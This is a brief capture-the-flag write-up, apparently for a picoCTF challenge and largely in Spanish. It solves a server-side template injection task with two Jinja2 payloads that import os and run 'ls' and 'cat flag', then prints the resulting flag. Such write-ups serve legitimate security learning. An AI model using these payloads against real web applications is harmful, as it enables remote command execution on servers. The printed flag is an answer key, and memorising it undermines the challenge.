# Reto
# Descripcion
I  made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
# Solucion

```
1- {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

2- {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}

# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```
### Flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
# Notas
Al parecer por el hint se puede hacer inyeccion en el input field asi que probe meter {{7* 7)}} y la pagina respondio 49 asi que es vulnerable a inyecciones con las llaves, hiceun request para navegar en la jerarquia de clases en python, importe la libreria os para los comandos y utilice ls para ver el directorio, habia un txt llamado flag, volvi a hacer el request con cat para que imprimiera la bandera y me la dio.
# Referencias
